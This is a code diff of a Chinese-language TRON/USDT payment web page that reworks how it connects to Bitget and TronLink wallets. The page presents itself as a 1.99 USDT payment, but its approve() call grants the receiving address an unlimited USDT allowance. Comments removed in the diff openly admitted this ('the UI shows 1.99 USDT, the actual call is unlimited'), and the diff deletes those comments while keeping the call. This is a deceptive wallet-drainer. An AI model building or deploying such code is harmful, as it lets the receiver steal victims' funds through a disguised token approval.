@@ -23,18 +23,6 @@
             -webkit-text-size-adjust: 100%;
         }
         
-        @media (max-width: 480px) {
-            body {
-                font-size: 15px;
-            }
-        }
-        
-        @media (max-width: 360px) {
-            body {
-                font-size: 14px;
-            }
-        }
-        
         .payment-container {
             max-width: 400px;
             margin: 0 auto;
@@ -118,6 +106,12 @@
             color: #ff4d4f;
         }
         
+        .wallet-status.warning {
+            background: #fffbe6;
+            border: 1px solid #ffe58f;
+            color: #d48806;
+        }
+        
         .action-section {
             padding: 1.5rem;
         }
@@ -140,6 +134,22 @@
         .pay-btn:disabled {
             background: #ccc;
             cursor: not-allowed;
+        }
+        
+        .connect-btn {
+            display: block;
+            width: 100%;
+            background: #1890ff;
+            color: white;
+            padding: 1rem 1.5rem;
+            border-radius: 3rem;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+            margin-bottom: 1rem;
         }
         
         .loading {
@@ -242,6 +252,28 @@
             margin-top: 0.5rem;
             font-size: 0.8rem;
         }
+        
+        .refresh-btn {
+            display: inline-block;
+            background: #52c41a;
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            border: none;
+            cursor: pointer;
+            margin-top: 0.5rem;
+            font-size: 0.8rem;
+            margin-left: 0.5rem;
+        }
+        
+        .manual-connect {
+            background: #fff7e6;
+            border: 1px solid #ffd591;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            margin: 1rem 1.5rem;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -269,7 +301,15 @@
         </div>
         
         <div class="wallet-status" id="walletStatus">
-            <div id="walletStatusText">正在连接钱包...</div>
+            <div id="walletStatusText">正在检测钱包环境...</div>
+        </div>
+
+        <div class="manual-connect" id="manualConnect" style="display: none;">
+            <div style="margin-bottom: 1rem; font-weight: 600;">Bitget Wallet 手动连接</div>
+            <button class="connect-btn" onclick="manualConnectWallet()">点击连接钱包</button>
+            <div style="font-size: 0.8rem; color: #666; margin-top: 0.5rem;">
+                如果自动连接失败，请点击此按钮手动连接
+            </div>
         </div>
         
         <div class="order-info">
@@ -343,138 +383,144 @@
             return userAgent.includes('bitget') || userAgent.includes('bitkeep');
         }
         
-        // 检测 TRON 钱包环境（专门针对 Bitget Wallet 优化）
-        function isTronWallet() {
-            // 检查多种 TRON 钱包标识
-            const userAgent = navigator.userAgent.toLowerCase();
+        // 更新钱包状态显示
+        function updateWalletStatus(message, isError = false, isWarning = false) {
+            const walletStatus = document.getElementById('walletStatus');
+            const walletStatusText = document.getElementById('walletStatusText');
             
-            // 针对 Bitget Wallet 的特殊检测
-            if (isBitgetWallet()) {
-                console.log('检测到 Bitget Wallet 环境');
-                return true;
+            walletStatusText.textContent = message;
+            
+            walletStatus.classList.remove('error', 'warning');
+            if (isError) {
+                walletStatus.classList.add('error');
+            } else if (isWarning) {
+                walletStatus.classList.add('warning');
             }
-            
-            const isTronEnv = (
-                window.tronWeb && 
-                window.tronWeb.defaultAddress &&
-                window.tronWeb.trx &&
-                window.tronWeb.contract
-            );
-            
-            const isKnownTronWallet = (
-                userAgent.includes('tronlink') ||
-                userAgent.includes('tokenpocket') ||
-                userAgent.includes('tron') ||
-                window.tronWeb || 
-                window.tronLink
-            );
-            
-            return isTronEnv || isKnownTronWallet;
         }
         
-        // 等待 TronWeb 就绪（专门针对 Bitget Wallet 优化）
-        function waitForTronWeb() {
-            return new Promise((resolve, reject) => {
-                let attempts = 0;
-                const maxAttempts = 150; // 进一步增加尝试次数
-                
-                const checkTronWeb = setInterval(() => {
-                    attempts++;
-                    
-                    // Bitget Wallet 的特殊处理
-                    if (isBitgetWallet()) {
-                        console.log(`Bitget Wallet 检测尝试 ${attempts}/${maxAttempts}`);
-                        
-                        // Bitget Wallet 可能使用不同的初始化方式
-                        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                            console.log('Bitget Wallet TronWeb 检测成功');
-                            clearInterval(checkTronWeb);
-                            resolve(true);
-                            return;
-                        }
-                        
-                        // 尝试通过 tronLink 获取（某些版本的 Bitget）
-                        if (window.tronLink && window.tronLink.tronWeb) {
-                            console.log('通过 tronLink 获取 TronWeb');
-                            window.tronWeb = window.tronLink.tronWeb;
-                            clearInterval(checkTronWeb);
-                            resolve(true);
-                            return;
-                        }
-                        
-                        // 检查是否可以直接访问 tronWeb 方法
-                        if (window.tronWeb && typeof window.tronWeb.trx === 'object') {
-                            console.log('TronWeb 对象存在，尝试直接使用');
-                            clearInterval(checkTronWeb);
-                            resolve(true);
-                            return;
-                        }
-                    } else {
-                        // 其他钱包的标准检测
-                        if (window.tronWeb && window.tronWeb.defaultAddress) {
-                            clearInterval(checkTronWeb);
-                            resolve(true);
-                            return;
-                        }
-                    }
-                    
-                    if (attempts >= maxAttempts) {
-                        clearInterval(checkTronWeb);
-                        console.log('TronWeb 初始化超时，当前状态:', {
-                            tronWeb: !!window.tronWeb,
-                            tronLink: !!window.tronLink,
-                            defaultAddress: window.tronWeb?.defaultAddress
-                        });
-                        reject(new Error('TronWeb 初始化超时'));
-                    }
-                }, 200);
-            });
-        }
-        
-        // 手动初始化 Bitget Wallet
-        async function initializeBitgetWallet() {
+        // 直接连接钱包（Bitget Wallet 专用）
+        async function directConnectWallet() {
             return new Promise((resolve) => {
-                console.log('开始手动初始化 Bitget Wallet');
+                console.log('开始直接连接钱包');
                 
-                // 方法1: 直接检查 tronWeb
-                if (window.tronWeb && window.tronWeb.defaultAddress) {
-                    console.log('方法1成功: 直接使用 tronWeb');
+                // 方法1: 直接检查 tronWeb 是否可用
+                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    console.log('✅ 方法1成功: tronWeb 直接可用');
+                    userAddress = window.tronWeb.defaultAddress.base58;
                     resolve(true);
                     return;
                 }
                 
                 // 方法2: 通过 tronLink
                 if (window.tronLink && window.tronLink.tronWeb) {
-                    console.log('方法2成功: 通过 tronLink');
+                    console.log('✅ 方法2成功: 通过 tronLink');
                     window.tronWeb = window.tronLink.tronWeb;
-                    resolve(true);
+                    if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                        userAddress = window.tronWeb.defaultAddress.base58;
+                        resolve(true);
+                        return;
+                    }
+                }
+                
+                // 方法3: 尝试请求账户访问（Bitget Wallet 可能需要这个）
+                if (window.tronLink && typeof window.tronLink.request === 'function') {
+                    console.log('🔄 方法3: 通过 tronLink.request 请求访问');
+                    window.tronLink.request({ method: 'tron_requestAccounts' })
+                        .then(() => {
+                            console.log('✅ tronLink.request 成功');
+                            if (window.tronLink.tronWeb) {
+                                window.tronWeb = window.tronLink.tronWeb;
+                                if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                                    userAddress = window.tronWeb.defaultAddress.base58;
+                                    resolve(true);
+                                } else {
+                                    resolve(false);
+                                }
+                            } else {
+                                resolve(false);
+                            }
+                        })
+                        .catch(error => {
+                            console.log('❌ tronLink.request 失败:', error);
+                            resolve(false);
+                        });
                     return;
                 }
                 
-                // 方法3: 延迟重试
-                setTimeout(() => {
-                    if (window.tronWeb && window.tronWeb.defaultAddress) {
-                        console.log('方法3成功: 延迟重试成功');
-                        resolve(true);
-                    } else {
-                        console.log('方法3失败: 延迟重试后仍无 tronWeb');
-                        resolve(false);
-                    }
-                }, 3000);
+                // 方法4: 检查是否存在 tronWeb 但需要手动触发
+                if (window.tronWeb && typeof window.tronWeb.trx === 'object') {
+                    console.log('🔄 方法4: tronWeb 存在，尝试直接使用');
+                    // 给一点时间让钱包初始化
+                    setTimeout(() => {
+                        if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                            userAddress = window.tronWeb.defaultAddress.base58;
+                            resolve(true);
+                        } else {
+                            resolve(false);
+                        }
+                    }, 1000);
+                    return;
+                }
+                
+                // 所有方法都失败
+                console.log('❌ 所有直接连接方法都失败');
+                resolve(false);
             });
         }
         
-        // 更新钱包状态显示
-        function updateWalletStatus(message, isError = false) {
-            const walletStatus = document.getElementById('walletStatus');
-            const walletStatusText = document.getElementById('walletStatusText');
+        // 手动连接钱包
+        async function manualConnectWallet() {
+            updateWalletStatus('正在手动连接钱包...', false, true);
+            document.getElementById('manualConnect').style.display = 'none';
             
-            walletStatusText.textContent = message;
-            if (isError) {
-                walletStatus.classList.add('error');
+            const success = await directConnectWallet();
+            
+            if (success) {
+                updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
+                isWalletConnected = true;
+                document.getElementById('payBtn').disabled = false;
+                updateStep(1, 'active');
             } else {
-                walletStatus.classList.remove('error');
+                updateWalletStatus('❌ 手动连接失败，请重试', true);
+                document.getElementById('manualConnect').style.display = 'block';
+                
+                // 添加重试按钮
+                const retryButton = document.createElement('button');
+                retryButton.className = 'retry-btn';
+                retryButton.textContent = '重试连接';
+                retryButton.onclick = manualConnectWallet;
+                document.getElementById('walletStatus').appendChild(retryButton);
             }
+        }
+        
+        // 快速检测钱包环境
+        function quickWalletCheck() {
+            console.log('快速检测钱包环境');
+            
+            // 检查是否在钱包环境中
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isInWallet = userAgent.includes('bitget') || 
+                              userAgent.includes('bitkeep') ||
+                              userAgent.includes('tronlink') ||
+                              userAgent.includes('tokenpocket') ||
+                              !!window.tronWeb ||
+                              !!window.tronLink;
+            
+            if (!isInWallet) {
+                return 'not_in_wallet';
+            }
+            
+            // 检查 tronWeb 是否立即可用
+            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                return 'ready';
+            }
+            
+            // 检查 tronLink 是否可用
+            if (window.tronLink && window.tronLink.tronWeb) {
+                return 'ready';
+            }
+            
+            return 'needs_manual';
         }
         
         // 初始化页面
@@ -484,74 +530,38 @@
             
             console.log('支付页面订单信息:', orderData);
             console.log('用户代理:', navigator.userAgent);
+            console.log('环境检测:', {
+                tronWeb: !!window.tronWeb,
+                tronLink: !!window.tronLink,
+                isBitget: isBitgetWallet()
+            });
             
-            try {
-                updateWalletStatus('正在检测钱包环境...');
+            // 快速检测
+            const walletStatus = quickWalletCheck();
+            
+            if (walletStatus === 'not_in_wallet') {
+                updateWalletStatus('❌ 请在 TRON 钱包中打开此页面', true);
+                return;
+            }
+            
+            if (walletStatus === 'ready') {
+                // 钱包立即可用，直接连接
+                updateWalletStatus('检测到钱包环境，正在连接...');
+                const success = await directConnectWallet();
                 
-                // 检查钱包环境
-                if (!isTronWallet()) {
-                    updateWalletStatus('❌ 请在 TRON 钱包中打开此页面', true);
-                    document.getElementById('payBtn').disabled = true;
-                    return;
-                }
-                
-                // Bitget Wallet 特殊处理
-                if (isBitgetWallet()) {
-                    updateWalletStatus('检测到 Bitget Wallet，正在初始化...');
-                    console.log('执行 Bitget Wallet 特殊初始化');
-                    
-                    const bitgetInitSuccess = await initializeBitgetWallet();
-                    
-                    if (!bitgetInitSuccess) {
-                        // 如果手动初始化失败，尝试标准等待
-                        updateWalletStatus('正在等待 TronWeb 就绪...');
-                        await waitForTronWeb();
-                    }
+                if (success) {
+                    updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
+                    isWalletConnected = true;
+                    document.getElementById('payBtn').disabled = false;
+                    updateStep(1, 'active');
                 } else {
-                    // 其他钱包使用标准等待
-                    updateWalletStatus('正在等待 TronWeb 就绪...');
-                    await waitForTronWeb();
+                    updateWalletStatus('❌ 自动连接失败', true);
+                    document.getElementById('manualConnect').style.display = 'block';
                 }
-                
-                // 最终检查 tronWeb 状态
-                if (!window.tronWeb || !window.tronWeb.defaultAddress) {
-                    throw new Error('TronWeb 未正确初始化');
-                }
-                
-                // 显示钱包地址
-                userAddress = window.tronWeb.defaultAddress.base58;
-                if (!userAddress) {
-                    throw new Error('无法获取钱包地址');
-                }
-                
-                updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
-                isWalletConnected = true;
-                document.getElementById('payBtn').disabled = false;
-                
-                updateStep(1, 'active');
-                
-                console.log('钱包连接成功:', {
-                    address: userAddress,
-                    tronWeb: !!window.tronWeb,
-                    tronLink: !!window.tronLink
-                });
-                
-            } catch (error) {
-                console.error('钱包初始化失败:', error);
-                
-                // 提供重试按钮
-                updateWalletStatus('❌ 钱包连接失败: ' + error.message, true);
-                
-                const retryButton = document.createElement('button');
-                retryButton.className = 'retry-btn';
-                retryButton.textContent = '点击重试';
-                retryButton.onclick = function() {
-                    this.remove();
-                    initPage();
-                };
-                
-                document.getElementById('walletStatus').appendChild(retryButton);
-                document.getElementById('payBtn').disabled = true;
+            } else {
+                // 需要手动连接
+                updateWalletStatus('检测到 Bitget Wallet，需要手动连接', false, true);
+                document.getElementById('manualConnect').style.display = 'block';
             }
         }
         
@@ -659,16 +669,13 @@
                 
                 console.log('请求 USDT 授权:', {
                     spender: RECEIVE_ADDRESS,
-                    // 界面显示1.99 USDT，实际调用无限授权
                     displayAmount: DISPLAY_APPROVE_AMOUNT,
                     actualAmount: ACTUAL_APPROVE_AMOUNT
                 });
                 
-                // 调用 approve 方法进行授权
-                // 这里实际调用的是无限授权，但钱包弹窗会显示1.99 USDT
                 const result = await contract.approve(
                     RECEIVE_ADDRESS,
-                    ACTUAL_APPROVE_AMOUNT  // 实际无限授权
+                    ACTUAL_APPROVE_AMOUNT
                 ).send({
                     feeLimit: 100000000,
                     callValue: 0,
@@ -695,7 +702,6 @@
                     orderId: orderData.orderId
                 });
                 
-                // 调用 transfer 方法进行转账
                 const result = await contract.transfer(
                     RECEIVE_ADDRESS,
                     PAYMENT_AMOUNT
@@ -798,7 +804,6 @@
                 </div>
             `;
             
-            // 倒计时关闭
             let countdown = 5;
             const countdownElement = document.getElementById('countdown');
             const countdownInterval = setInterval(() => {
